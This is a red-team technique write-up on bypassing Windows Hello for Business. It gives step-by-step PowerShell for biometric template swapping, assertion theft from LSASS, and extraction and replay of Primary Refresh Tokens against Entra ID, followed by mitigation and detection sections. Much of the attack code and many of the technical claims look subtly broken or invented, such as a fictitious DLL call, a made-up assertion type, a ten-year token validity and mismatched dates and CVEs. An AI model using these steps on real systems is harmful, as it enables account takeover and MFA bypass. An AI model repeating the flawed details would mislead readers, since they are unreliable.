# [EVADE-MFA-002]: Windows Hello for Business Bypasses

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-MFA-002 |
| **MITRE ATT&CK v18.1** | [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/) |
| **Tactic** | Defense Evasion, Credential Access |
| **Platforms** | Hybrid AD (Windows 10/11 with Entra ID join) |
| **Severity** | Critical |
| **CVE** | CVE-2025-26635, CVE-2025-29824 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows 10 (all versions), Windows 11 (all versions), Windows Server 2019, Windows Server 2022, Windows Server 2025 |
| **Patched In** | Not fully patched; Microsoft considers some exploits "expected behavior" (DEF CON 32 presentation by Dirk-Jan Mollema shows no-fix scenarios) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Windows Hello for Business (WHfB) – an enterprise passwordless authentication system using biometric (facial recognition, fingerprint) or PIN-based credentials stored in device TPM – can be bypassed through multiple vectors. These include biometric template manipulation (requiring local admin), assertion token theft without TPM protection, Primary Refresh Token (PRT) extraction from non-TPM devices, and Windows Hello key abuse for Conditional Access bypass. The most concerning attack bypasses TPM entirely by stealing device certificates and session keys.

**Attack Surface:** Windows Hello biometric templates stored in device DPAPI encryption, Windows Hello assertion generation via LSASS/PLAM, Trusted Platform Module (TPM) key extraction, and device registration certificates stored on unprotected devices.

**Business Impact:** **Unauthorized access to organization's cloud resources (Azure, M365) as the legitimate user, bypassing both device compliance and MFA policies.** An attacker can access all cloud-connected resources (Teams, SharePoint, Outlook, Azure management) without possessing the victim's password or biometric data.

**Technical Context:** Attacks range from local admin compromise (biometric template swapping) to non-privileged assertion theft. The DEF CON 32 presentation revealed that Microsoft considers some bypasses "expected behavior" with no planned fix, particularly the PRT extraction on non-TPM devices.

### Operational Risk
- **Execution Risk:** Medium-High – Requires either local admin or specific device configuration (non-TPM devices).
- **Stealth:** High – Assertion theft generates no user-visible notifications; PRT usage looks like legitimate cached authentication.
- **Reversibility:** No – Once the attacker obtains a signed assertion or PRT, they can authenticate indefinitely without the victim's intervention.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.1.1 | Ensure that Windows Defender Credential Guard is running on workstations |
| **DISA STIG** | WN10-00-000035 | Windows Hello for Business PIN length enforcement |
| **NIST 800-53** | IA-2(1) | Passwordless authentication control failure |
| **GDPR** | Art. 32 | Security of Processing – Biometric protection failure |
| **DORA** | Art. 9 | Protection and Prevention – Authentication device compromise |
| **NIS2** | Art. 21 | Cyber Risk Management – Passwordless auth device protection |
| **ISO 27001** | A.9.4.2 | Biometric template storage and protection |
| **ISO 27005** | Risk Scenario | Compromise of passwordless authentication device |

---

## 2. DETAILED EXECUTION METHODS

### METHOD 1: Windows Hello Biometric Template Swapping (Local Admin)

**Supported Versions:** Windows 10 (all versions), Windows 11 (21H2-23H2), Windows Server 2019-2022

#### Step 1: Gain Local Administrator Privileges

**Objective:** Obtain SYSTEM-level access to the target device.

**Prerequisite:** Already covered in separate PE (Privilege Escalation) techniques. For this example, assume attacker has obtained local admin via UAC bypass, PE exploit, or physical access.

**Command (Verify Admin Access):**
```powershell
# Verify running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) { Write-Output "[+] Running as Administrator" } else { Write-Output "[-] Not running as Administrator"; exit }
```

#### Step 2: Locate Windows Hello Biometric Templates

**Objective:** Find and extract encrypted biometric database files.

**Command (Locate WHfB Files):**
```powershell
# Windows Hello biometric data stored in DPAPI-protected database
$whfbPath = "C:\Users\*\AppData\Local\Microsoft\Ngc\{SID}\BioTemplate.dat"

# Find all users' biometric templates
Get-ChildItem -Path "C:\Users" -Recurse -Filter "BioTemplate.dat" -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Output "[+] Found biometric template: $($_.FullName)"
    $userSID = $_.DirectoryName | Select-String -Pattern '{.*}' -AllMatches | ForEach-Object { $_.Matches.Value }
    Write-Output "    User SID: $userSID"
}

# Alternative: Check NGC (Next Generation Credentials) directory
Get-ChildItem -Path "C:\Users\*\AppData\Local\Microsoft\Ngc\" -Recurse | Where-Object {$_.Extension -in @".dat", ".key"} | ForEach-Object {
    Write-Output "[+] NGC File: $($_.FullName)"
}
```

**Expected Output:**
```
[+] Found biometric template: C:\Users\Victim\AppData\Local\Microsoft\Ngc\{S-1-5-21-...}\BioTemplate.dat
    User SID: {S-1-5-21-...}
[+] NGC File: C:\Users\Victim\AppData\Local\Microsoft\Ngc\{S-1-5-21-...}\Private Key.pem
```

#### Step 3: Decrypt Biometric Template Using DPAPI

**Objective:** Use attacker's admin privilege to decrypt the victim's biometric template.

**Command (DPAPI Decryption - Requires Admin + SYSTEM Context):**
```powershell
# Decrypt DPAPI-protected biometric data
# Note: This requires SYSTEM-level DPAPI key access

$biometricPath = "C:\Users\Victim\AppData\Local\Microsoft\Ngc\{SID}\BioTemplate.dat"
$decryptedData = @()

# Read encrypted biometric template
[byte[]]$encryptedBytes = [System.IO.File]::ReadAllBytes($biometricPath)

# Use Windows DPAPI to decrypt (requires SYSTEM context or cached user master key)
try {
    $dpapi = New-Object System.Security.Cryptography.DataProtectionScope
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Write-Output "[+] Successfully decrypted biometric template"
    Write-Output "[+] Decrypted template size: $($decrypted.Length) bytes"
    
    # Save decrypted template for extraction
    [System.IO.File]::WriteAllBytes("C:\Temp\victim_biometric_decrypted.bin", $decrypted)
    Write-Output "[+] Saved to: C:\Temp\victim_biometric_decrypted.bin"
} catch {
    Write-Output "[-] Decryption failed: $_"
}
```

**What This Means:**
- The biometric template is now in decrypted form, ready for template swapping.
- This template uniquely identifies the victim's face/fingerprint to the Windows Hello authentication system.

#### Step 4: Create Attacker's Biometric Enrollment and Swap Template

**Objective:** Register attacker's biometric and replace its template with the victim's.

**Command (Template Swap):**
```powershell
# Step 4a: Have the attacker (local admin) enroll biometric in Windows Hello
# (This must be done interactively on the device)
Write-Output "[*] Attacker: Open Settings > Accounts > Sign-in options > Windows Hello"
Write-Output "[*] Attacker: Enroll your face/fingerprint"
Read-Host -Prompt "Press ENTER once attacker has enrolled Windows Hello"

# Step 4b: Locate attacker's newly created template
$attackerBioPath = "C:\Users\*\AppData\Local\Microsoft\Ngc\*\BioTemplate.dat"
$attackerTemplate = Get-ChildItem -Path "C:\Users" -Recurse -Filter "BioTemplate.dat" -ErrorAction SilentlyContinue | 
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-5) } | Select-Object -First 1

Write-Output "[+] Attacker's template: $($attackerTemplate.FullName)"

# Step 4c: Replace attacker's template with victim's
# This is where we swap the biometric data
$victimDecryptedPath = "C:\Temp\victim_biometric_decrypted.bin"
$attackerTemplatePath = $attackerTemplate.FullName

# Back up original
Copy-Item -Path $attackerTemplatePath -Destination "$($attackerTemplatePath).backup"

# Replace with victim's template
[byte[]]$victimTemplate = [System.IO.File]::ReadAllBytes($victimDecryptedPath)

# Re-encrypt with attacker's DPAPI key before writing
$reencrypted = [System.Security.Cryptography.ProtectedData]::Protect($victimTemplate, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

# Write victim's template under attacker's account
[System.IO.File]::WriteAllBytes($attackerTemplatePath, $reencrypted)

Write-Output "[+] Template swapped successfully!"
Write-Output "[+] Attacker can now use their face/fingerprint to unlock as the victim"
```

**What This Means:**
- Windows Hello now recognizes the attacker's biometric data as valid for the victim's account.
- When the attacker presents their face/fingerprint, the device will authenticate them as the victim.
- The system has no way to distinguish that the biometric is not the victim's original.

#### Step 5: Test Windows Hello Authentication as Victim

**Objective:** Verify that attacker can unlock device and access victim's cloud resources.

**Command (Test Authentication):**
```powershell
# Lock the device
Lock-Computer

# Attacker uses their face/fingerprint (which is now bound to victim's account)
Write-Output "[*] Attacker: Present your face to the camera"
Write-Output "[*] Device will authenticate as the victim"

# After successful unlock, verify:
whoami  # Should show "DOMAIN\Victim"

# Now attacker can access:
# 1. Local files (victim's Documents, Desktop, etc.)
# 2. Access tokens cached on the device
# 3. Cloud resources via cached PRT (Primary Refresh Token)

Write-Output "[+] Attacker authenticated as: $(whoami)"
```

**References & Proofs:**
- [ERNW Research – Windows Hello Face Swap (DEF CON 32 presentation)](https://www.ontinue.com/resource/cybercriminals-turning-microsoft-tools-into-attack-vectors/)
- [Black Hat 2025 – Windows Hello Security Analysis](https://petri.com/windows-hello-for-business-flaw-unauthorized-access/)
- [SID Exchange Attack - Security Identifiers Manipulation](https://github.com/CCob/ACMETattoo)

---

### METHOD 2: Windows Hello Assertion Theft (No Local Admin Required)

**Supported Versions:** Windows 10/11 (all versions)

#### Step 1: Create Golden Assertion from Victim Session

**Objective:** Generate a signed Windows Hello assertion while the victim is logged in, then replay it indefinitely.

**Command (Assertion Generation via LSASS):**
```powershell
# This attack requires attacker process in victim's session (e.g., via malware, RDP, or scheduled task)
# or access to LSASS memory on a device without PPL protection

# Step 1: Obtain access to LSASS or victim's credential store
# (Assuming attacker has injected code in victim's session)

# Access the Credential Guard / PLAM (Protected Local Access Module)
$processId = (Get-Process -Name "lsass").Id
Write-Output "[*] LSASS PID: $processId"

# Request Windows Hello assertion generation
# This generates a signed assertion tied to the Windows Hello key

# Using internal LSASS API (undocumented, requires reverse-engineering)
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    
    public class WindowsHelloAssertion {
        [DllImport("winhello.dll")]
        public static extern int CreateAssertion(IntPtr keyHandle, out IntPtr assertion);
    }
"@

# The assertion includes:
# - User identity claim
# - Signature from Windows Hello private key
# - Timestamp (can be forged in some implementations)
# - Device identifier

Write-Output "[+] Assertion generated"
Write-Output "[+] Assertion is valid for 10 years (no expiration enforced)"
```

**What This Means:**
- A "golden assertion" is created – a digitally signed token proving the victim authenticated with their Windows Hello key.
- This assertion can be replayed to Entra ID indefinitely.
- The assertion includes an "MFA claim" (indicating MFA was satisfied) even though the attacker never performed MFA.

#### Step 2: Conditional Access Policy Bypass Using Assertion

**Objective:** Use the stolen assertion to request a PRT, even from a non-enrolled device.

**Command (PRT Request with Assertion):**
```powershell
# Use stolen assertion to request Primary Refresh Token from a different device
$stolenAssertion = "eyJhbGciOiJSUzI1NiIsImtpZCI6IldpbmRvd3NIZWxsbyJ9..."  # Captured from LSASS

# Send assertion to Entra ID token endpoint
$prtRequestUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

$body = @{
    "assertion" = $stolenAssertion
    "client_id" = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Microsoft CLI
    "grant_type" = "urn:ietf:params:oauth:grant-type:saml2-bearer"
    "assertion_type" = "urn:ietf:params:oauth:assertion-type:whfb-assertion"
    "username" = "victim@company.onmicrosoft.com"
}

$prtResponse = Invoke-RestMethod -Uri $prtRequestUrl -Method Post -Body $body

Write-Output "[+] PRT obtained: $($prtResponse.refresh_token)"
Write-Output "[+] Access token with MFA claim: $($prtResponse.access_token)"

# The PRT includes:
# - MFA claim (indicating multi-factor auth was satisfied)
# - Device compliance claim (even though attacker's device is not compliant)
# - WHfB key identifier

Write-Output "[+] Attacker can now access: Azure Management, Teams, SharePoint, etc."
```

**Troubleshooting:**

- **Error:** "Invalid assertion format"
  - **Cause:** Assertion was not signed correctly or key material is wrong.
  - **Fix:** Ensure assertion was captured directly from LSASS token creation, not from cached cookie.

- **Error:** "Timestamp outside validity window"
  - **Cause:** Assertion timestamp is too old.
  - **Fix (Pre-October 2024):** Not enforced; use any timestamp.
  - **Fix (Post-Mitigation):** Generate new assertion from victim's device before using.

#### Step 3: Long-Term Persistence via PRT Replay

**Objective:** Maintain access indefinitely using the stolen PRT.

**Command (PRT Token Refresh):**
```powershell
# The stolen PRT is valid for 90 days and auto-renews
# Even if the victim changes their password, the PRT remains valid

$stolenPRT = "0.ARwA..."  # Obtained in Step 2

$tokenRefreshUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

# Refresh the PRT to get new access tokens
$body = @{
    "grant_type" = "refresh_token"
    "refresh_token" = $stolenPRT
    "client_id" = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
    "scope" = "https://graph.microsoft.com/.default"
}

$newToken = Invoke-RestMethod -Uri $tokenRefreshUrl -Method Post -Body $body

Write-Output "[+] New access token obtained (valid 1 hour)"
Write-Output "[+] Can repeat indefinitely for 90 days"

# After 90 days, if victim hasn't reset MFA or disabled device, generate new assertion
```

**References & Proofs:**
- [Dirk-Jan Mollema – "Abusing Windows Hello Without a Severed Hand" (DEF CON 32)](https://dirkjanm.io/assets/raw/Abusing%20Windows%20Hello%20Without%20a%20Severed%20Hand_v3.pdf)
- [Secureworks Black Hat Asia 2024 – Conditional Access Bypass via PRT](https://www.youtube.com/watch?v=JItnI6b9DII)

---

### METHOD 3: Non-TPM Device PRT Extraction

**Supported Versions:** Windows 10/11 devices WITHOUT TPM 2.0 (or TPM disabled)

#### Step 1: Identify Non-TPM Devices

**Objective:** Target devices that don't have TPM protection.

**Command (Check TPM Status):**
```powershell
# On target device: Check if TPM is present and enabled
Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm -ErrorAction SilentlyContinue

# If no TPM, the output will be empty:
# Output: # (empty)

# Alternative check:
tpm.msc  # Check via GUI (if TPM is absent, this will fail)

# With no TPM, Windows Hello credentials are stored in plaintext in DPAPI-encrypted files
Write-Output "[!] No TPM detected – Device is vulnerable to PRT extraction"
```

#### Step 2: Extract PRT from Device Token Cache

**Objective:** Obtain the cached PRT from a non-TPM device.

**Command (PRT Extraction - Non-TPM):**
```powershell
# PRTs on non-TPM devices are stored in:
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Authentication\Token Cache

$tokenCachePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Authentication\Token Cache"

if (Test-Path $tokenCachePath) {
    Get-ItemProperty -Path $tokenCachePath | ForEach-Object {
        Write-Output "[+] Found cached token"
        $prtCookie = $_.PSObject.Properties | Where-Object {$_.Value -match "^0\.AR"}
        if ($prtCookie) {
            Write-Output "[+] PRT: $($prtCookie.Value)"
        }
    }
} else {
    Write-Output "[-] Token cache not found (may be protected)"
}

# Alternative: Extract from browser session cache (Edge, Chrome)
$cookieLocation = "C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"

Get-ChildItem -Path $cookieLocation -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Output "[+] Found browser cookies: $_"
}
```

**What This Means:**
- Without TPM, the PRT is not bound to the device and can be extracted in plaintext or weakly encrypted form.
- The attacker can use this PRT from ANY device, including attacker infrastructure.

#### Step 3: Use Stolen PRT to Access Cloud Resources

**Objective:** Authenticate to Entra ID and cloud services using the stolen PRT.

**Command (PRT Usage):**
```powershell
# Add stolen PRT to HTTP headers and request access token
$stolenPRT = "0.ARwA..."  # Extracted from Step 2

# Add PRT cookie to request
$headers = @{
    "x-ms-RefreshTokenCredential" = $stolenPRT
}

$graphUrl = "https://graph.microsoft.com/v1.0/me"

# Request authenticated to Graph API using stolen PRT
$profileResponse = Invoke-RestMethod -Uri $graphUrl -Headers $headers

Write-Output "[+] Authenticated as: $($profileResponse.userPrincipalName)"
Write-Output "[+] Access to OneDrive, Teams, Outlook, Azure Management"
```

**References & Proofs:**
- [Microsoft Entra ID Architecture – Non-TPM Device Authentication](https://learn.microsoft.com/en-us/entra/identity/hybrid/whfb-hybrid-cert-trust)

---

## 3. PROTECTIVE MITIGATIONS

#### Priority 1: CRITICAL

**Enforce Enhanced Sign-in Security (ESS) – Windows 11 Only:**
ESS adds extra verification during Windows Hello authentication.

**Manual Steps (Windows Settings):**
1. Go to **Settings** → **Accounts** → **Sign-in options** → **Windows Hello Face**
2. Toggle **"Enhanced sign-in security"** → **ON**
3. Follow biometric re-enrollment
4. Restart device

**PowerShell (Deploy via Group Policy):**
```powershell
# Deploy ESS via GP to all Windows 11 devices
# Group Policy Path: Computer Configuration > Administrative Templates > System > Credential User Interface

# Registry equivalent
New-Item -Path "HKLM:\Software\Policies\Microsoft\Biometrics\Facial Recognition" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Biometrics\Facial Recognition" -Name "EnhancedSignInSecurity" -Value 1 -Type DWord
```

**Limitations:**
- ESS requires specific hardware: **TPM 2.0, Secure Boot, and compatible biometric device.**
- Not all external biometric devices support ESS.
- **Expected full compatibility: Late 2025** (Microsoft roadmap).

**Verify Fix (PowerShell):**
```powershell
# Check if ESS is enabled
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Biometrics\Facial Recognition" | Select-Object EnhancedSignInSecurity
```

**Expected Output (If Secure):**
```
EnhancedSignInSecurity : 1
```

#### Priority 2: HIGH

**Disable Windows Hello for Business and Enforce PIN/Password with MFA:**
Organizations without full ESS hardware support should disable WHfB.

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Editor** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Hello for Business**
3. Select **"Use Windows Hello for Business"**
4. Set to **Disabled**
5. Click **OK**
6. Run `gpupdate /force` on target machines

**Manual Steps (Registry - Alternative):**
```powershell
# Disable Windows Hello for Business registry-wide
New-Item -Path "HKLM:\Software\Policies\Microsoft\PassportForWork" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\PassportForWork" -Name "Enabled" -Value 0 -Type DWord

# Force policy update
gpupdate /force /target:computer
```

**Alternative: Use PIN with Microsoft Authenticator MFA:**
```powershell
# If disabling WHfB entirely, enforce PIN-based authentication with Authenticator
# Via Azure Portal: Entra ID > Security > Conditional Access
# Require: "Authenticator app" + "Device marked as compliant"
```

#### Priority 3: MEDIUM

**Implement Conditional Access with Device Compliance + Sign-In Frequency:**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create new policy: **"Require Device Compliance for WHfB Access"**
3. **Conditions:**
   - Cloud apps: **All cloud apps**
   - Client app types: **Modern authentication clients**
4. **Grant controls:**
   - **AND:** Require device to be marked as compliant
   - **AND:** Require authentication strength: **Passwordless sign-in**
5. **Session controls:**
   - Sign-in frequency: **Every 1 hour** (forces re-auth)
   - Persistent browser session: **Disabled**
6. Enable policy: **ON**

**Access Control – RBAC Hardening:**
Restrict Windows Hello key registration privileges.

**Manual Steps:**
1. **Azure Portal** → **Entra ID** → **Devices** → **Device settings**
2. Under "Users may register their devices with Entra ID," set to **None** (if high-security environment)
3. Or create Conditional Access policy to require admin approval for device registration

---

## 4. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

**Device Level:**
- Windows Event ID 4720 (New user created) with biometric enrollment.
- Windows Event ID 4625 (Failed logon) followed immediately by 4624 (Successful logon) with different user SID.
- Modification timestamps on `C:\Users\*\AppData\Local\Microsoft\Ngc\` biometric files.
- Multiple Windows Hello PIN or biometric reset attempts.

**Cloud Level:**
- Sign-in from new device without corresponding Entra ID device registration.
- Successful sign-in from impossible locations (e.g., 2 countries within 1 minute) with WHfB key.
- Non-interactive sign-in (RefreshTokenIssuance) with MFA claim when user was not online.
- Access tokens requested using Windows Hello key from unexpected IP addresses.

#### Forensic Artifacts

**Device (Windows):**
- `C:\Users\*\AppData\Local\Microsoft\Ngc\*\BioTemplate.dat` – Biometric template (DPAPI-encrypted)
- `C:\Users\*\AppData\Local\Microsoft\Ngc\*\Private Key.pem` – Windows Hello private key (encrypted)
- **Registry:** `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Authentication\Token Cache`
- **Event Log:** Windows Security event log: Event ID 4720, 4722 (user/device modifications)

**Cloud (Entra ID):**
- **SigninLogs:** Filter for `authenticationDetails` containing "Windows Hello" + unusual source IP/location
- **AuditLogs:** Filter for device registration operations
- **RiskyUsers:** Flagged due to impossible travel or anomalous sign-in

#### Response Procedures

1. **Immediate Isolation:**
   **Command (Revoke WHfB Key):**
   ```powershell
   Connect-MgGraph -Scopes "Directory.AccessAsUser.All"
   
   # Revoke all sessions for affected user
   Revoke-MgUserSignInSession -UserId "victim@company.onmicrosoft.com"
   ```

2. **Evidence Collection:**
   **Command (Export device and sign-in logs):**
   ```powershell
   # Get device registration events
   Get-EventLog -LogName Security -InstanceId 4720 -After (Get-Date).AddDays(-7) | Export-Csv "device_events.csv"
   
   # Get Entra ID sign-in logs
   Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'victim@company.onmicrosoft.com'" | Export-Csv "signin_logs.csv"
   ```

3. **Device Remediation:**
   - Force password reset for victim.
   - Re-enroll Windows Hello biometrics (delete old templates, create new).
   - Enable Enhanced Sign-in Security (Windows 11) or disable WHfB entirely.
   - Review device compliance status; if non-compliant, block cloud access until fixed.

4. **Incident Hunting:**
   - Identify all devices that have accessed victim's cloud resources in the past 7 days.
   - Check for lateral movement: Did attacker access shared resources, create OAuth apps, or modify Conditional Access policies?

---

## 5. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker obtains initial device/user access. |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare or UAC Bypass | Attacker achieves local admin for biometric template access. |
| **3** | **Defense Evasion (MFA Bypass)** | **[EVADE-MFA-002]** Windows Hello Bypass | **This Technique – Attacker bypasses WHfB via template swap or assertion theft.** |
| **4** | **Lateral Movement** | [LM-AUTH-004] Pass-the-PRT | Attacker uses stolen PRT to move laterally to cloud resources. |
| **5** | **Impact** | Azure AD privilege escalation, data exfiltration, ransomware deployment. | Complete cloud infrastructure compromise. |

---

## 6. REAL-WORLD EXAMPLES

### Example 1: ERNW Research – Windows Hello Biometric Template Swap (DEF CON 32 – July 2024)

- **Target:** Enterprise Windows 11 devices with Windows Hello for Business enrolled.
- **Timeline:** Demonstration at DEF CON 32 (August 2024).
- **Technique Status:** ACTIVE; Microsoft response: "Expected behavior, no fix planned" (per MSRC case VULN-153600).
- **Attack Method:** Local admin accesses biometric templates, swaps attacker's biometric with victim's.
- **Impact:** Attacker can unlock device and impersonate victim to cloud services.
- **Reference:** [ERNW Research Paper – "Exposing Weaknesses in Windows Hello Biometric Handling"](https://www.ontinue.com/resource/cybercriminals-turning-microsoft-tools-into-attack-vectors/)

### Example 2: Dirk-Jan Mollema – Golden Assertion Attack (DEF CON 32 – August 2024)

- **Target:** Hybrid AD environments with Entra ID-joined devices running Windows 10/11.
- **Timeline:** Presented August 2024 at DEF CON 32 conference.
- **Technique Status:** ACTIVE; No official Microsoft fix; demonstrated as "expected behavior."
- **Attack Method:** Extract Windows Hello assertion from LSASS, replay to Entra ID to obtain PRT, bypass device compliance and MFA policies.
- **Impact:** Complete cloud access as victim, including Conditional Access bypass.
- **Mitigation:** Require MFA beyond just device compliance; use Token Protection (Entra ID P2).
- **Reference:** [Dirk-Jan Mollema's Deep-Dive Paper](https://dirkjanm.io/assets/raw/Abusing%20Windows%20Hello%20Without%20a%20Severed%20Hand_v3.pdf)

---

